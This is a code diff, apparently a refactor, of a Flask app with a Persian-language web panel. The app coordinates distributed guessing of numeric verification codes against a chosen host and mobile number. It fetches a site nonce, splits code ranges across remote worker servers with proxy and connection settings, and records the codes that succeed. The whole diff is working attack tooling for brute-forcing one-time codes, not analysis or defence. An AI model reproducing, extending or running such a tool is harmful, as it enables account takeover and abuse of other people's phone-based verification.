+                        fetch('/get_success')
+                    ]);
+                    const statusData = await statusRes.json();
+                    const successData = await successRes.json();
+
+                    updateStatusTable(statusData);
+                    updateSuccessList(successData);
+                    
+                    const isAnyRunning = Object.values(statusData).some(s => s.running);
+                    setButtonState(isAnyRunning);
+
+                } catch (error) {
+                    console.error("Error refreshing data:", error);
+                    addLog("خطا در به‌روزرسانی داده‌ها از سرور.");
+                }
+            }
+
+            // Event Listeners
             document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                 radio.addEventListener('change', () => {
-                    const customRangeDiv = document.getElementById('custom_range');
-                    customRangeDiv.classList.toggle('hidden', radio.value !== 'custom');
+                    document.getElementById('custom_range_container').classList.toggle('hidden', radio.value !== 'custom');
                 });
             });
 
-            fetchNonceBtn.addEventListener('click', () => {
-                const host = document.getElementById('host').value;
-                const mobile = document.getElementById('mobile').value;
-                fetch('/fetch_nonce', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ host, mobile })
-                })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.nonce) {
-                            document.getElementById('nonce').value = data.nonce;
-                        } else {
-                            alert('خطا در دریافت nonce: ' + (data.error || 'مشکل ناشناخته'));
-                        }
-                    });
-            });
+            startBtn.addEventListener('click', async () => {
+                setButtonState(true);
+                addLog("درخواست شروع عملیات...");
 
-            startBtn.addEventListener('click', () => {
-                const host = document.getElementById('host').value;
-                const nonce = document.getElementById('nonce').value;
-                const mobile = document.getElementById('mobile').value;
-                const connections = document.getElementById('connections').value;
-                const proxy = document.getElementById('proxy').value;
-                const scanType = document.querySelector('input[name="scan_type"]:checked').value;
-                let startRange = null;
-                let endRange = null;
-
-                if (scanType === 'custom') {
-                    startRange = document.getElementById('start_range').value;
-                    endRange = document.getElementById('end_range').value;
-                    if (!startRange || !endRange || startRange >= endRange) {
-                        alert('لطفاً رنج معتبر وارد کنید!');
-                        return;
-                    }
+                const payload = {
+                    host: document.getElementById('host').value,
+                    nonce: document.getElementById('nonce').value,
+                    mobile: document.getElementById('mobile').value,
+                    connections: parseInt(document.getElementById('connections').value),
+                    proxy: document.getElementById('proxy').value,
+                    scan_type: document.querySelector('input[name="scan_type"]:checked').value,
+                    start_range: document.getElementById('start_range').value,
+                    end_range: document.getElementById('end_range').value,
+                };
+                
+                if (!payload.host || !payload.mobile) {
+                    alert("هاست و شماره موبایل الزامی است.");
+                    setButtonState(false);
+                    return;
                 }
 
-                fetch('/start', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ host, nonce, mobile, connections, scan_type: scanType, start_range: startRange, end_range: endRange, proxy })
-                }).then(response => {
-                    if (response.ok) {
-                        startBtn.disabled = true;
-                        stopBtn.disabled = false;
-                    }
-                });
-
-                fetch('/set_proxy', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ proxy })
-                });
+                try {
+                    const response = await fetch('/start', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (!response.ok) throw new Error(`Server responded with ${response.status}`);
+                    addLog("درخواست شروع با موفقیت به سرور ارسال شد.");
+                } catch (error) {
+                    addLog(`خطا در ارسال درخواست شروع: ${error.message}`);
+                    setButtonState(false);
+                }
             });
 
-            stopBtn.addEventListener('click', () => {
-                fetch('/stop', {
-                    method: 'POST'
-                }).then(() => {
-                    startBtn.disabled = false;
-                    stopBtn.disabled = true;
-                });
+            stopBtn.addEventListener('click', async () => {
+                addLog("درخواست توقف عملیات...");
+                try {
+                    await fetch('/stop', { method: 'POST' });
+                    addLog("درخواست توقف به سرور ارسال شد.");
+                } catch (error) {
+                    addLog(`خطا در ارسال درخواست توقف: ${error.message}`);
+                }
+                setButtonState(false);
             });
+
+            // Socket.IO
+            socket.on('connect', () => console.log('Connected to WebSocket.'));
+            socket.on('update_progress', (data) => addLog(data.log));
+
+            // Initial load and periodic refresh
+            setInterval(refreshData, 3000);
+            refreshData();
         </script>
     </body>
     </html>
     ''')
 
 @app.route('/start', methods=['POST'])
-def start():
-    global progress_log, found_success, success_codes, current_operation
+def start_operation():
+    if app_state.current_operation.get('is_running'):
+        return jsonify({"error": "An operation is already in progress."}), 409
+
     data = request.get_json()
+    app_state.reset()
+    app_state.proxy_setting = data.get('proxy', '')
+
     host = data['host']
-    nonce = data['nonce']
     mobile = data['mobile']
-    connections = int(data['connections'])
-    scan_type = data.get('scan_type', 'full')
-    start_range = data.get('start_range')
-    end_range = data.get('end_range')
-
-    found_success = False
-    progress_log = []
-    success_codes = []
-    message = f"🚀 شروع عملیات\nهاست: {host}\nموبایل: {mobile}\nکانکشن‌ها: {connections}\nنوع اسکن: {scan_type}"
-    progress_log.append(message)
-    send_to_telegram(message)
-    socketio.emit('update_progress', {'log': progress_log[-1]})
-
-    if scan_type == 'full':
-        ranges = RANGES
-    else:
-        start_range = int(start_range)
-        end_range = int(end_range)
-        total_range = end_range - start_range
-        chunk_size = total_range // len(REMOTE_SERVERS)
-        ranges = []
-        for i in range(len(REMOTE_SERVERS)):
-            chunk_start = start_range + (i * chunk_size)
-            chunk_end = chunk_start + chunk_size if i < len(REMOTE_SERVERS) - 1 else end_range
-            ranges.append((chunk_start, chunk_end))
-
-    threads = []
-    for i, server in enumerate(REMOTE_SERVERS):
-        start_r, end_r = ranges[i]
-        thread = threading.Thread(
-            target=send_to_remote,
-            args=(server, host, nonce, mobile, connections, start_r, end_r)
-        )
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
-
-    current_operation = {
-        'host': host,
-        'nonce': nonce,
-        'mobile': mobile,
-        'connections': connections,
-        'ranges': ranges,
-        'proxy': proxy_setting
-    }
+    nonce = data.get('nonce')
     
-    threading.Thread(target=auto_stop_and_restart, daemon=True).start()
+    app_state.add_log(f"🚀 Operation initiated for host: {host}, mobile: {mobile}")
 
-    return '', 204
+    # Fetch nonce if not provided
+    if not nonce:
+        app_state.add_log("Nonce not provided, attempting to fetch automatically...")
+        nonce = fetch_nonce(host, mobile)
+        if not nonce:
+            return jsonify({"error": "Failed to fetch nonce automatically."}), 400
+
+    # Determine ranges
+    scan_type = data.get('scan_type', 'full')
+    if scan_type == 'full':
+        ranges = FULL_SCAN_RANGES
+    else:
+        try:
+            start_r = int(data['start_range'])
+            end_r = int(data['end_range'])
+            total_range = end_r - start_r
+            chunk_size = total_range // len(REMOTE_SERVERS)
+            ranges = []
+            for i in range(len(REMOTE_SERVERS)):
+                chunk_start = start_r + (i * chunk_size)
+                chunk_end = chunk_start + chunk_size -1 if i < len(REMOTE_SERVERS) - 1 else end_r
+                ranges.append((chunk_start, chunk_end))
+        except (ValueError, TypeError):
+            return jsonify({"error": "Invalid custom range provided."}), 400
+    
+    operation_details = {
+        'host': host, 'nonce': nonce, 'mobile': mobile,
+        'connections': int(data['connections']), 'ranges': ranges,
+        'is_running': True
+    }
+    app_state.current_operation = operation_details
+
+    # Start the background manager
+    threading.Thread(target=operation_manager, args=(operation_details,)).start()
+
+    return jsonify({"message": "Operation started successfully."}), 202
 
 @app.route('/stop', methods=['POST'])
-def stop():
-    global progress_log
-    stop_all_servers()
-    message = "🛑 توقف دستی توسط کاربر درخواست شد"
-    progress_log.append(message)
-    send_to_telegram(message)
-    return '', 204
-
-@app.route('/set_proxy', methods=['POST'])
-def set_proxy():
-    global proxy_setting
-    data = request.get_json()
-    proxy_setting = data.get('proxy', '')
-    message = f"🔧 پروکسی تنظیم شد: {proxy_setting}"
-    progress_log.append(message)
-    send_to_telegram(message)
-    socketio.emit('update_progress', {'log': progress_log[-1]})
-    return '', 204
+def stop_operation():
+    stop_all_workers(manual_stop=True)
+    with app_state.lock:
+        app_state.current_operation['is_running'] = False
+    return jsonify({"message": "Stop signal sent to all workers."}), 200
 
 @app.route('/get_status', methods=['GET'])
 def get_status():
-    return jsonify(get_worker_status())
+    return jsonify(get_workers_status())
 
 @app.route('/get_success', methods=['GET'])
 def get_success():
-    global success_codes
-    return jsonify(success_codes)
-
-@app.route('/get_operation', methods=['GET'])
-def get_operation():
-    global current_operation
-    return jsonify(current_operation)
-
-@app.route('/fetch_nonce', methods=['POST'])
-def fetch_nonce_route():
-    data = request.get_json()
-    host = data['host']
-    mobile = data['mobile']
-    nonce = fetch_nonce(host, mobile)
-    if nonce:
-        return jsonify({'nonce': nonce})
-    return jsonify({'error': 'دریافت nonce ناموفق بود'}), 400
+    with app_state.lock:
+        return jsonify(list(app_state.success_codes))
 
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5001, debug=True)
+    socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
